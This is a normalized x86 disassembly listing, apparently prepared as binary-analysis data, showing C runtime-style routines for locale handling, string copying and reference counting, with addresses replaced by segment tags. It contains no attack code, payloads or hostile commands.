mov [ ebp - 0x4 ] esi
mov [ rwxdata ] edi
mov eax [ ebp + 0x18 ]
mov [ rwxdata ] eax
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
movzx eax [ ebp + 0x1c ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_41530a
lea ecx [ ebp - 0x74 ]
call sub_419797
mov [ ebp - 0x1c ] eax
mov ecx rwxdata
call sub_414877
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419abe
mov eax [ ebp - 0x1c ]
call sub_4083c5
retn
sub_419ac7
push 0x64
push r--data
call sub_408380
mov edi [ ebp + 0x14 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x5
call sub_40ec0c
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x5
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rwxdata ] edi
mov eax [ ebp + 0x18 ]
mov [ rwxdata ] eax
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_41530a
lea ecx [ ebp - 0x74 ]
call sub_419797
mov [ ebp - 0x1c ] eax
mov ecx rwxdata
call sub_414877
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419b58
mov eax [ ebp - 0x1c ]
call sub_4083c5
retn
sub_419b61
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov al [ eax ]
sub esp 0x24
push ebx
push esi
push edi
test al al
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
add esp 0xc
inc [ rwxdata ]
and [ ebp - 0xc ] 0x0
movzx edi al
mov esi 0xffff0000
and [ ebp - 0x8 ] esi
mov eax edi
or ebx 0xffffffff
mov [ ebp - 0x1 ] 0x0
cmp eax 0x4e
jg r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_415b7f
jle r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_415d61
sub eax 0x43
cmp eax 0xa
ja r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] esi
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp ebx 0xfffffffe
jne r-xdata
mov eax edi
sub eax 0x43
je r-xdata
lea eax [ ebp - 0x24 ]
jmp r-xdata
cmp eax 0x53
jle r-xdata
movzx eax [ eax + lookup_table_419f19 ]
jmp [ eax * 4 + jump_table_419f01 ]
cmp [ eax ] 0x0
jne r-xdata
push r--data
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
mov esi 0x800
or [ ebp - 0x10 ] esi
push eax
call sub_4198d6
add esp 0x10
test [ ebp - 0x18 ] esi
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
push 0x2
pop ecx
sub eax ecx
je r-xdata
dec [ rwxdata ]
push eax
call sub_417a44
mov edx [ eax + 0x4 ]
pop ecx
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
mov ebx edi
and ebx 0x3
jmp r-xdata
cmp eax 0x58
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_4198d6
add esp 0x10
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_415d61
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x20
lea ecx [ ebp - 0x24 ]
call sub_415852
mov ecx eax
call sub_415cc7
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_415aa8
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
push r--data
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0xc ]
call sub_415b7f
jmp r-xdata
mov eax [ ebp + 0x8 ]
test bl 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_415b7f
test bl 0x2
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x24 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
sub eax ecx
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
inc [ rwxdata ]
mov [ ebp - 0x1 ] al
movzx eax al
cmp eax 0x4d
jg r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_415b7f
push r--data
lea ecx [ ebp - 0xc ]
call sub_415d61
jmp r-xdata
sub eax ecx
je r-xdata
cmp eax 0x4e
je r-xdata
cmp eax 0x4c
jge r-xdata
sub eax 0x14
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x4f
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x47
jg r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
sub eax 0x45
je r-xdata
push 0xfffffffe
pop ebx
cmp eax 0x52
je r-xdata
cmp eax 0x48
jl r-xdata
cmp eax 0x46
jge r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x57
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x49
jle r-xdata
push r--data
jmp r-xdata
test eax eax
je r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
add eax 0xffffffa8
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
cmp eax 0x4b
jg r-xdata
dec [ rwxdata ]
push 0x1
lea ecx [ ebp - 0xc ]
call sub_4155c6
jmp r-xdata
cmp eax 0x24
je r-xdata
sub eax ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push r--data
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_419b61
push eax
push r--data
push [ ebp + 0x8 ]
call sub_415f67
add esp 0x14
jmp r-xdata
add eax 0xffffffbc
cmp eax 0x1
ja r-xdata
sub eax ecx
jne r-xdata
push r--data
jmp r-xdata
sub_419f24
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rwxdata ]
movsx eax [ eax ]
push ebx
xor ebx ebx
mov ecx 0xffff0000
and [ ebp - 0x4 ] ecx
sub eax ebx
push esi
mov [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp + 0xc ]
sub eax 0x24
je r-xdata
mov eax [ rwxdata ]
mov al [ eax + 0x1 ]
cmp al 0x24
je r-xdata
sub eax 0x1d
mov esi [ ebp + 0xc ]
je r-xdata
add [ rwxdata ] 0x2
mov eax [ rwxdata ]
movsx eax [ eax ]
mov esi [ ebp + 0xc ]
cmp eax 0x51
jg r-xdata
cmp al bl
je r-xdata
push r--data
dec eax
je r-xdata
sub eax 0x52
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
mov [ eax ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x8 ]
call sub_415b7f
cmp [ esi ] ebx
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_419b61
push r--data
lea ecx [ ebp - 0x8 ]
call sub_415b7f
cmp [ esi ] ebx
je r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_415d0f
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_415d0f
inc [ rwxdata ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ esi ]
mov esi [ esi + 0x4 ]
inc [ rwxdata ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
or esi 0x100
mov [ ebp - 0xc ] esi
call sub_4198d6
add esp 0x10
jmp r-xdata
push esi
jmp r-xdata
sub eax 0x41
je r-xdata
mov ecx [ ebp + 0x8 ]
inc [ rwxdata ]
push r--data
call sub_41587f
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
inc [ rwxdata ]
push esi
push [ ebp + 0x8 ]
call sub_418e19
jmp r-xdata
dec eax
je r-xdata
pop ecx
pop ecx
jmp r-xdata
inc [ rwxdata ]
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_416d00
jmp r-xdata
dec eax
jne r-xdata
add esp 0xc
inc [ rwxdata ]
and [ ebp - 0x4 ] ecx
push ebx
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x18 ]
push esi
push eax
mov [ ebp - 0x8 ] ebx
call sub_4191f8
push eax
push [ ebp + 0x8 ]
call sub_419b61
add esp 0x1c
jmp r-xdata
sub_41a0d5
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
call sub_41543a
mov eax [ rwxdata ]
mov al [ eax ]
xor ecx ecx
cmp al cl
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push 0x1
call sub_41548d
cmp al 0x3f
je r-xdata
inc [ rwxdata ]
and [ ebp - 0xc ] 0xffff0000
push ecx
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_4191f8
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_419f24
add esp 0x1c
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
inc [ rwxdata ]
cmp [ ebp - 0x8 ] ecx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_419f24
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push r--data
call sub_41587f
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_41587f
jmp r-xdata
mov ecx eax
call sub_415cc7
sub_41a1a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push esi
push 0x0
push 0x8
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
xor esi esi
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov esi eax
jmp r-xdata
push esi
push [ ebp + 0x8 ]
call sub_41a0d5
lea eax [ ebp - 0x10 ]
push eax
call sub_415379
mov eax [ ebp - 0x10 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x20
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_415d0f
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_415cc7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_41a21d
call sub_411171
test eax eax
je r-xdata
test [ rwxdata ] 0x2
je r-xdata
push 0x16
call sub_4113d0
pop ecx
push 0x3
call sub_40a4bb
int3
push 0x1
push 0x40000015
push 0x3
call sub_40765a
add esp 0xc
sub_41a250
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rwxdata ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rwxdata ] ecx
pop ebp
retn
sub_41a271
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_407823
mov eax esi
jmp r-xdata
sub_41a326
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_405894
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_411e7a
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_409ff1
pop ecx
cmp eax esi
je r-xdata
call sub_41a440
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_41a400
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41a326
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41a46c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_406900
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40c530
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4121cc
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41a524
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a46c
add esp 0xc
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_41a562
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_40bc84
pop ecx
pop edi
sub_41a588
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40af3b
mov ecx [ eax + 0x70 ]
push 0x0
pop edx
test cl 0x2
sete dl
lea esi [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
or [ rwxdata ] 0xffffffff
test edx edx
je r-xdata
mov eax esi
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
mov [ eax + 0x70 ] ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_41a60f
push 0x8
push r--data
call sub_408380
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4083c5
retn
push 0xd
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a6bc
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_409812
pop ecx
push 0xc
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_40bd13
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rwxdata
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a6c8
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_409812
pop ecx
cmp eax rwxdata
je r-xdata
push eax
call sub_40bdac
pop ecx
sub_41a6dc
push 0xc
push r--data
call sub_408380
call sub_40af3b
mov edi eax
push 0x1
push 0x8
call sub_40c060
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
call sub_40bf44
call sub_40b785
mov eax [ edi + 0x6c ]
mov [ esi ] eax
mov eax [ edi + 0x68 ]
mov [ esi + 0x4 ] eax
push 0xc
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_40bc84
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a776
push 0xd
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x4 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a782
mov eax esi
call sub_4078ae
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_4083c5
retn
sub_41a793
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4077b7
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b736
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_41a7d4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_40c890
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_41b7b0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_41a271
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_41a271
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_4077b7
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_41b7b0
test eax eax
sub_41a8f3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410b69
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4077b7
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a793
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a793
add esp 0x14
sub_41a95e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_40c01b
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_41a793
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4077b7
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_410f30
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_41a793
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_409812
pop ecx
push r--data
push ebx
push edi
call sub_41b736
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_409812
pop ecx
push [ ebp - 0x10 ]
call sub_409812
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_409812
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_409812
pop ecx
sub_41aac3
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_40af3b
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_40c2b0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_41a7d4
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_410f30
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_410b69
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_41bdc3
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_410f30
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_41a8f3
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_4090d0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
